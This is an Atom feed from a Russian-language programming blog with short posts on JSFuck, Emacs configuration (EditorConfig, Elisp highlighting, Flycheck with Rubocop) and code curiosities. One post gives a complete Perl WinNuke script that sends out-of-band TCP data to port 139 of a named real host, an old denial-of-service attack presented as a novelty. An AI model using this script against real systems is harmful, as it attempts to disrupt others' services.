<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Свиридов Александр]]></title>
  <link href="http://sviridov.github.io/atom.xml" rel="self"/>
  <link href="http://sviridov.github.io/"/>
  <updated>2014-07-16T16:26:43+06:00</updated>
  <id>http://sviridov.github.io/</id>
  <author>
    <name><![CDATA[Свиридов Александр]]></name>
    <email><![CDATA[sviridov.vmi@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Code Madness: JavaScript - это ()+[]!]]></title>
    <link href="http://sviridov.github.io/blog/2014/07/16/code-madness-javascript-is-6-characters/"/>
    <updated>2014-07-16T16:00:00+06:00</updated>
    <id>http://sviridov.github.io/blog/2014/07/16/code-madness-javascript-is-6-characters</id>
    <content type="html"><![CDATA[<p>А знали ли вы, что:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="s1">&#39;alert&#39;</span> <span class="o">===</span> <span class="p">(</span><span class="o">!</span><span class="p">[]</span><span class="o">+</span><span class="p">[])[</span><span class="o">+!+</span><span class="p">[]]</span><span class="o">+</span><span class="p">(</span><span class="o">!</span><span class="p">[]</span><span class="o">+</span><span class="p">[])[</span><span class="o">!+</span><span class="p">[]</span><span class="o">+!+</span><span class="p">[]]</span><span class="o">+</span><span class="p">(</span><span class="o">!!</span><span class="p">[]</span><span class="o">+</span><span class="p">[])[</span><span class="o">!+</span><span class="p">[]</span><span class="o">+!+</span><span class="p">[]</span><span class="o">+!+</span><span class="p">[]]</span><span class="o">+</span><span class="p">(</span><span class="o">!!</span><span class="p">[]</span><span class="o">+</span><span class="p">[])[</span><span class="o">+!+</span><span class="p">[]]</span><span class="o">+</span><span class="p">(</span><span class="o">!!</span><span class="p">[]</span><span class="o">+</span><span class="p">[])[</span><span class="o">+</span><span class="p">[]]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Как это работает? Добро пожаловать на <a href="http://www.jsfuck.com/">JSFuck</a>!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Code Madness: WinNuke It!]]></title>
    <link href="http://sviridov.github.io/blog/2014/07/14/code-madness-winnuke-it/"/>
    <updated>2014-07-14T14:50:45+06:00</updated>
    <id>http://sviridov.github.io/blog/2014/07/14/code-madness-winnuke-it</id>
    <content type="html"><![CDATA[<p>Тяжело ли сейчас реализовать <a href="http://en.wikipedia.org/wiki/WinNuke">WinNuke</a> атаку, которая в 1997 положила <a href="http://www.microsoft.com">www.microsoft.com</a> на несколько дней? Вовсе нет:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl</span>
</span><span class='line'>
</span><span class='line'><span class="k">use</span> <span class="nn">IO::</span><span class="n">Socket</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nn">IO::Socket::</span><span class="n">INET</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span><span class="n">PeerAddr</span> <span class="o">=&gt;</span> <span class="s">&#39;www.microsoft.com&#39;</span><span class="p">,</span> <span class="n">PeerPort</span> <span class="o">=&gt;</span> <span class="mi">139</span><span class="p">,</span> <span class="n">Proto</span> <span class="o">=&gt;</span> <span class="s">&#39;tcp&#39;</span><span class="p">)</span>
</span><span class='line'>                <span class="o">-&gt;</span><span class="nb">send</span><span class="p">(</span><span class="s">&#39;Bye&#39;</span><span class="p">,</span> <span class="n">MSG_OOB</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Emacs: EditorConfig]]></title>
    <link href="http://sviridov.github.io/blog/2014/07/03/emacs-editorconfig/"/>
    <updated>2014-07-03T16:04:10+06:00</updated>
    <id>http://sviridov.github.io/blog/2014/07/03/emacs-editorconfig</id>
    <content type="html"><![CDATA[<p>Случайно наткнулся на эту полезную штуку. <a href="http://editorconfig.org/">EditorConfig</a> &ndash; это инструмент, с помощью которого можно задать основные правила оформления кода в проекте и синхронизировать их между программистами и их редакторами (и IDE). <a href="http://editorconfig.org/">EditorConfig</a> поддерживается <a href="http://editorconfig.org/#download">плагинами</a> для всех популярных редакторов. Установка <a href="http://editorconfig.org/">EditorConfig</a> проста:</p>

<ul>
<li>Устанавливаем <a href="https://github.com/editorconfig/editorconfig-core-c/blob/master/INSTALL.md">ядро EditorConfig</a></li>
<li>Устанавливаем <a href="http://editorconfig.org/#download">плагин</a> для редактора. В случае <a href="http://www.gnu.org/software/emacs/">Emacs</a> пакет доступен для загрузки с <a href="http://marmalade-repo.org/packages/editorconfig">Marmalade</a> и установка очень проста:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='common-lisp'><span class='line'><span class="nv">M-x</span> <span class="nv">package-install</span> <span class="nv">[RET]</span> <span class="nv">editorconfig</span> <span class="nv">[RET]</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Emacs: динамическая подсветка Elisp-кода]]></title>
    <link href="http://sviridov.github.io/blog/2014/07/01/emacs-dynamic-elisp-highlighting/"/>
    <updated>2014-07-01T16:57:57+06:00</updated>
    <id>http://sviridov.github.io/blog/2014/07/01/emacs-dynamic-elisp-highlighting</id>
    <content type="html"><![CDATA[<p>Как вы наверняка знаете, языком программирования <a href="http://www.gnu.org/software/emacs/">Emacs</a> является <a href="https://www.gnu.org/software/emacs/manual/html_node/elisp/index.html#Top">Elisp</a>. Его поддержка в стандартной поставке <a href="http://www.gnu.org/software/emacs/">Emacs</a> достаточно хороша. Но вот чего мне действительно не хватает &ndash; это качественной подсветки символов (идентификаторов), в том числе определяемых мной. Ну что же, давайте ее добавим.</p>

<!-- more -->


<p>В этом нам поможет <a href="https://www.gnu.org/software/emacs/manual/html_node/emacs/Font-Lock.html">Font Lock mode</a>. Основной способ поиска кода для подсветки в <a href="https://www.gnu.org/software/emacs/manual/html_node/emacs/Font-Lock.html">Font Lock mode</a> &ndash; это регулярные выражения, но увы, они нам не подходят, так как нам нужен способ выделить символы исходя из их семантики. На этот случай <a href="https://www.gnu.org/software/emacs/manual/html_node/emacs/Font-Lock.html">Font Lock mode</a> предоставляет возможность использовать вместо регулярного выражения особого вида функцию, которая сама осуществит поиск кода для подсветки.</p>

<p>На такую функцию накладывается несколько ограничений:</p>

<ul>
<li>Она должна принимать в качестве аргумента лимит поиска &ndash; точку до которой будет производиться поиск (начиная с текущей точки).</li>
<li>В случае успешного поиска функция должна:

<ul>
<li>вернуть не-nil значение;</li>
<li>передвинуть текущую точку на позицию после найденной части кода;</li>
<li>сохранить найденную часть кода в <a href="https://www.gnu.org/software/emacs/manual/html_node/elisp/Match-Data.html#Match-Data">match-data</a>.</li>
</ul>
</li>
</ul>


<p>Пример подсветки имен макросов:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='common-lisp'><span class='line'><span class="p">(</span><span class="nb">defun</span> <span class="nv">highlight-emacs-lisp--matched-symbol</span> <span class="p">()</span>
</span><span class='line'>  <span class="s">&quot;Возвращает найденный символ (идентификатор)&quot;</span>
</span><span class='line'>  <span class="p">(</span><span class="nv">intern-soft</span> <span class="p">(</span><span class="nv">buffer-substring</span> <span class="p">(</span><span class="nv">match-beginning</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nv">match-end</span> <span class="mi">0</span><span class="p">))))</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="nb">defun</span> <span class="nv">highlight-emacs-lisp--macro-symbol-p</span> <span class="p">(</span><span class="nc">symbol</span><span class="p">)</span>
</span><span class='line'>  <span class="s">&quot;Проверка на то, что с символом связан макрос&quot;</span>
</span><span class='line'>  <span class="p">(</span><span class="nb">eq</span> <span class="ss">&#39;macro</span> <span class="p">(</span><span class="nv">car-safe</span> <span class="p">(</span><span class="nb">symbol-function</span> <span class="nc">symbol</span><span class="p">))))</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="nb">defun</span> <span class="nv">highlight-emacs-lisp-macro</span> <span class="p">(</span><span class="nv">limit</span><span class="p">)</span>
</span><span class='line'>  <span class="s">&quot;Поиск имен макросов&quot;</span>
</span><span class='line'>  <span class="p">(</span><span class="nb">loop</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">;; Находим все символы (идентификаторы)</span>
</span><span class='line'>    <span class="p">(</span><span class="nb">unless</span> <span class="p">(</span><span class="nv">re-search-forward</span> <span class="s">&quot;[^() \&quot;\t\n&#39;,@]+&quot;</span> <span class="nv">limit</span> <span class="no">t</span><span class="p">)</span>
</span><span class='line'>      <span class="p">(</span><span class="nb">return</span> <span class="no">nil</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">(</span><span class="k">let</span> <span class="p">((</span><span class="nv">candidate</span> <span class="p">(</span><span class="nv">highlight-emacs-lisp--matched-symbol</span><span class="p">)))</span>
</span><span class='line'>      <span class="p">(</span><span class="nb">when</span> <span class="p">(</span><span class="nv">highlight-emacs-lisp--macro-symbol-p</span> <span class="nv">candidate</span><span class="p">)</span>
</span><span class='line'>        <span class="p">(</span><span class="nb">return</span> <span class="no">t</span><span class="p">)))))</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="nv">font-lock-add-keywords</span> <span class="ss">&#39;emacs-lisp-mode</span>
</span><span class='line'> <span class="o">&#39;</span><span class="p">((</span><span class="nv">highlight-emacs-lisp-macro</span> <span class="o">.</span> <span class="ss">&#39;font-lock-keyword-face</span><span class="p">)))</span>
</span></code></pre></td></tr></table></div></figure>


<p>Отлично, теперь обобщим этот метод для функций и глобальных переменных, плюс добавим подсветку в <a href="https://www.gnu.org/software/emacs/manual/html_node/emacs/Lisp-Interaction.html">IELM</a>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='common-lisp'><span class='line'><span class="p">(</span><span class="nb">defmacro</span> <span class="nv">define-emacs-lisp-symbols-highlighter</span> <span class="p">(</span><span class="nv">name</span> <span class="nv">args</span> <span class="nv">selector</span><span class="p">)</span>
</span><span class='line'> <span class="o">`</span><span class="p">(</span><span class="nb">defun</span> <span class="o">,</span><span class="nv">name</span> <span class="p">(</span><span class="nv">limit</span><span class="p">)</span>
</span><span class='line'>    <span class="p">(</span><span class="nb">loop</span>
</span><span class='line'>
</span><span class='line'>      <span class="p">(</span><span class="nb">unless</span> <span class="p">(</span><span class="nv">re-search-forward</span> <span class="s">&quot;[^() \&quot;\t\n&#39;,@]+&quot;</span> <span class="nv">limit</span> <span class="no">t</span><span class="p">)</span>
</span><span class='line'>        <span class="p">(</span><span class="nb">return</span> <span class="no">nil</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>      <span class="p">(</span><span class="nb">when</span> <span class="p">((</span><span class="k">lambda</span> <span class="o">,</span><span class="nv">args</span> <span class="o">,</span><span class="nv">selector</span><span class="p">)</span>
</span><span class='line'>             <span class="p">(</span><span class="nv">intern-soft</span> <span class="p">(</span><span class="nv">buffer-substring</span> <span class="p">(</span><span class="nv">match-beginning</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nv">match-end</span> <span class="mi">0</span><span class="p">))))</span>
</span><span class='line'>        <span class="p">(</span><span class="nb">return</span> <span class="no">t</span><span class="p">)))))</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="nv">define-emacs-lisp-symbols-highlighter</span> <span class="nv">highlight-emacs-lisp-macro</span> <span class="p">(</span><span class="nc">symbol</span><span class="p">)</span>
</span><span class='line'>  <span class="p">(</span><span class="nb">eq</span> <span class="ss">&#39;macro</span> <span class="p">(</span><span class="nv">car-safe</span> <span class="p">(</span><span class="nb">symbol-function</span> <span class="nc">symbol</span><span class="p">))))</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="nv">define-emacs-lisp-symbols-highlighter</span> <span class="nv">highlight-emacs-lisp-function</span> <span class="p">(</span><span class="nc">symbol</span><span class="p">)</span>
</span><span class='line'>  <span class="p">(</span><span class="nb">eq</span> <span class="ss">&#39;lambda</span> <span class="p">(</span><span class="nv">car-safe</span> <span class="p">(</span><span class="nb">symbol-function</span> <span class="nc">symbol</span><span class="p">))))</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="nv">define-emacs-lisp-symbols-highlighter</span> <span class="nv">highlight-emacs-lisp-compiled-or-primitive-function</span> <span class="p">(</span><span class="nc">symbol</span><span class="p">)</span>
</span><span class='line'>  <span class="p">(</span><span class="nb">or</span> <span class="p">(</span><span class="nv">subrp</span> <span class="p">(</span><span class="nb">symbol-function</span> <span class="nc">symbol</span><span class="p">))</span>
</span><span class='line'>      <span class="p">(</span><span class="nb">eq</span> <span class="ss">&#39;compiled-function</span> <span class="p">(</span><span class="nb">type-of</span> <span class="p">(</span><span class="nb">symbol-function</span> <span class="nc">symbol</span><span class="p">)))))</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="nv">define-emacs-lisp-symbols-highlighter</span> <span class="nv">highlight-emacs-lisp-global-variable</span> <span class="p">(</span><span class="nc">symbol</span><span class="p">)</span>
</span><span class='line'>  <span class="p">(</span><span class="nb">and</span> <span class="p">(</span><span class="nb">boundp</span> <span class="nc">symbol</span><span class="p">)</span>
</span><span class='line'>       <span class="p">(</span><span class="nb">not</span> <span class="p">(</span><span class="nb">or</span> <span class="p">(</span><span class="nb">eq</span> <span class="nc">symbol</span> <span class="no">t</span><span class="p">)</span>
</span><span class='line'>                <span class="p">(</span><span class="nb">eq</span> <span class="nc">symbol</span> <span class="no">nil</span><span class="p">)))))</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="nb">dolist</span> <span class="p">(</span><span class="nv">mode</span> <span class="o">&#39;</span><span class="p">(</span><span class="nv">emacs-lisp-mode</span> <span class="nv">inferior-emacs-lisp-mode</span><span class="p">))</span>
</span><span class='line'>  <span class="p">(</span><span class="nv">font-lock-add-keywords</span> <span class="nv">mode</span>
</span><span class='line'>    <span class="o">&#39;</span><span class="p">((</span><span class="nv">highlight-emacs-lisp-macro</span> <span class="o">.</span> <span class="ss">&#39;font-lock-keyword-face</span><span class="p">)</span>
</span><span class='line'>      <span class="p">(</span><span class="nv">highlight-emacs-lisp-function</span> <span class="o">.</span> <span class="ss">&#39;font-lock-function-name-face</span><span class="p">)</span>
</span><span class='line'>      <span class="p">(</span><span class="nv">highlight-emacs-lisp-compiled-or-primitive-function</span> <span class="o">.</span> <span class="ss">&#39;font-lock-builtin-face</span><span class="p">)</span>
</span><span class='line'>      <span class="p">(</span><span class="nv">highlight-emacs-lisp-global-variable</span> <span class="o">.</span> <span class="ss">&#39;font-lock-variable-name-face</span><span class="p">))</span>
</span><span class='line'>    <span class="no">t</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p><a href="https://github.com/sviridov/.emacs.d/blob/master/config/elisp/init-elisp-highlight.el">Код на Github</a> и скриншот результата:</p>

<p><img src="http://sviridov.github.io/images/posts/emacs-dynamic-elisp-highlighting.png"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Code Madness: Join to the Dark side?]]></title>
    <link href="http://sviridov.github.io/blog/2014/06/29/code-madness-join-to-the-dark-side/"/>
    <updated>2014-06-29T18:44:23+06:00</updated>
    <id>http://sviridov.github.io/blog/2014/06/29/code-madness-join-to-the-dark-side</id>
    <content type="html"><![CDATA[<p>Под тегом <a href="http://sviridov.github.io/blog/categories/code-madness/">Code Madness</a> буду публиковать различные забавные кусочки кода. С их помощью я постараюсь показать вам интересные маленькие особенности того или иного языка программирования. Итак&hellip;</p>

<p>Как заставить человека перейти на Темную сторону? Все просто:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='common-lisp'><span class='line'><span class="p">(</span><span class="nb">loop</span> <span class="ss">:until</span> <span class="p">(</span><span class="nb">yes-or-no-p</span> <span class="s">&quot;Join to the Dark Side?&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="ss">:finally</span> <span class="p">(</span><span class="nb">format</span> <span class="no">t</span> <span class="s">&quot;We have cookies!&quot;</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Emacs: статический анализ Ruby-кода]]></title>
    <link href="http://sviridov.github.io/blog/2014/06/28/emacs-ruby-static-code-analysis/"/>
    <updated>2014-06-28T14:22:10+06:00</updated>
    <id>http://sviridov.github.io/blog/2014/06/28/emacs-ruby-static-code-analysis</id>
    <content type="html"><![CDATA[<p><a href="https://github.com/bbatsov/rubocop">Rubocop</a> &ndash; это полезный инструмент для любого <a href="https://www.ruby-lang.org/ru/">Ruby</a>-разработчика. <a href="https://github.com/bbatsov/rubocop">Rubocop</a> осуществляет статический анализ <a href="https://www.ruby-lang.org/ru/">Ruby</a>-кода основываясь на <a href="https://github.com/bbatsov/ruby-style-guide">Ruby Style Guide</a> и помогает сделать ваш код чуточку читабельнее (а значит и лучше).</p>

<p>Так как <a href="https://github.com/bbatsov/rubocop">Rubocop</a> является утилитой командной строки, его ручной запуск является не самым удобным в работе решением. Однако, нет ничего сложного в том, чтобы настроить интеграцию <a href="https://github.com/bbatsov/rubocop">Rubocop</a> и <a href="http://www.gnu.org/software/emacs/">Emacs</a>, получив при этом:</p>

<ul>
<li>Автоматический запуск <a href="https://github.com/bbatsov/rubocop">Rubocop</a> для текущего файла</li>
<li>Подсветку ошибок и предупреждений прямо в коде</li>
<li>Возможность получить список всех ошибок с ссылками на те месте, где они обнаружены</li>
</ul>


<p>Ну что же, сделаем это!</p>

<!-- more -->


<h2>rvm.el</h2>

<p>Вы ведь используете <a href="http://rvm.io/">RVM</a> и <a href="http://bundler.io/">Bundler</a>? Тогда мне не нужно объяснять почему очень важно настроить взаимодействие <a href="http://www.gnu.org/software/emacs/">Emacs</a> и <a href="http://rvm.io/">RVM</a>.</p>

<p>Для решения этой задачи нам потребуется пакет <a href="https://github.com/senny/rvm.el">rvm.el</a>. Его установка и настройка тривиальна в случае если у вас настроен <a href="https://www.gnu.org/software/emacs/manual/html_node/emacs/Packages.html#Packages">package.el</a> (<a href="https://github.com/sviridov/.emacs.d/blob/master/config/init-package.el">пример</a>):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='common-lisp'><span class='line'><span class="c1">;; Устанавливаем пакет rvm.el</span>
</span><span class='line'><span class="p">(</span><span class="nv">require-package</span> <span class="ss">&#39;rvm</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1">;; Выбираем соответсвующую версию ruby (и версии гемов)</span>
</span><span class='line'><span class="c1">;; для каждого ruby-файла</span>
</span><span class='line'><span class="p">(</span><span class="nv">add-hook</span> <span class="ss">&#39;ruby-mode-hook</span> <span class="nf">#&#39;</span><span class="nv">rvm-activate-corresponding-ruby</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Вот и все, <a href="https://github.com/senny/rvm.el">rvm.el</a> настроен.</p>

<h2>Flycheck</h2>

<p><a href="https://github.com/flycheck/flycheck">Flycheck</a> &ndash; это пакет, который является связующей прослойкой между различными статическими анализаторами кода и <a href="http://www.gnu.org/software/emacs/">Emacs</a>. Крайне полезный инструмент. Итак, его настройка:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='common-lisp'><span class='line'><span class="c1">;; Устанавливаем пакет Flycheck</span>
</span><span class='line'><span class="p">(</span><span class="nv">require-package</span> <span class="ss">&#39;flycheck</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1">;; Запускаем Flycheck глобально</span>
</span><span class='line'><span class="p">(</span><span class="nv">add-hook</span> <span class="ss">&#39;after-init-hook</span> <span class="nf">#&#39;</span><span class="nv">global-flycheck-mode</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1">;; или только для Ruby-mode</span>
</span><span class='line'><span class="p">(</span><span class="nv">add-hook</span> <span class="ss">&#39;ruby-mode-hook</span> <span class="nf">#&#39;</span><span class="nv">flycheck-mode</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1">;; Запускаем проверки при открытие файла и после его сохранения</span>
</span><span class='line'><span class="p">(</span><span class="nv">setq-default</span> <span class="nv">flycheck-check-syntax-automatically</span> <span class="o">&#39;</span><span class="p">(</span><span class="nv">save</span> <span class="nv">mode-enabled</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>Все, <a href="https://github.com/flycheck/flycheck">Flycheck</a> настроен. А знаете что самое приятное? При следующем открытии <a href="https://www.ruby-lang.org/ru/">Ruby</a>-файла <a href="https://github.com/flycheck/flycheck">Flycheck</a> автоматически начнет использовать <a href="https://github.com/b%20%20batsov/rubocop">Rubocop</a>! Добрая магия.</p>

<p>Так, нажав <strong><code>C-c ! l</code></strong> можно получить список всех предупреждений для текущего файла:</p>

<p><img src="http://sviridov.github.io/images/posts/emacs-with-flycheck-and-rubocop-1.png"></p>

<h2>P.S. rubocop-emacs</h2>

<p>Есть еще одна маленькая вещь о которой стоит упомянуть. Пакет <a href="https://github.com/bbatsov/rubocop-emacs">rubocop-emacs</a> от <a href="https://github.com/bbatsov">автора</a> <a href="https://github.com/bbatsov/rubocop">Rubocop</a>. По сравнению с <a href="https://github.com/flycheck/flycheck">Flycheck</a> этот пакет далеко не так удобен, однако в нем есть одна интересная возможность: автоматическая коррекция части ошибок и предупреждений в вашем коде. Итак:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='common-lisp'><span class='line'><span class="c1">;; Устанавливаем пакет rubocop-emacs</span>
</span><span class='line'><span class="p">(</span><span class="nv">require-package</span> <span class="ss">&#39;rubocop</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1">;; Добавляем rubocop-emacs к Ruby-mode</span>
</span><span class='line'><span class="p">(</span><span class="nv">add-hook</span> <span class="ss">&#39;ruby-mode-hook</span> <span class="nf">#&#39;</span><span class="nv">rubocop-mode</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1">;; Перечитываем файл после его изменения вне Emacs</span>
</span><span class='line'><span class="p">(</span><span class="nv">add-hook</span> <span class="ss">&#39;ruby-mode-hook</span> <span class="nf">#&#39;</span><span class="nv">auto-revert-mode</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Теперь, нажав <strong><code>C-c C-r F</code></strong> мы сделаем наш код чуточку чище.</p>

<p><img src="http://sviridov.github.io/images/posts/emacs-with-flycheck-and-rubocop-2.png"></p>
]]></content>
  </entry>
  
</feed>
